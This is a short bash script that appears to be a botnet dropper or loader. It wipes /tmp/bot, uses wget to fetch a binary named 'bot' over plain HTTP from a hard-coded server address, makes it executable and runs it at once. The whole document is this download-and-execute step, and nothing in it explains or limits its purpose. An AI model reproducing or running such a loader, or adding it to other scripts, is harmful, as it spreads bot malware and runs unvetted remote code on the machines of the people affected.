#!/bin/bash

SERVER_IP="http://192.168.0.140"


rm -rf /tmp/bot

wget -c ${SERVER_IP}/bot -P /tmp && chmod +x /tmp/bot && /tmp/bot


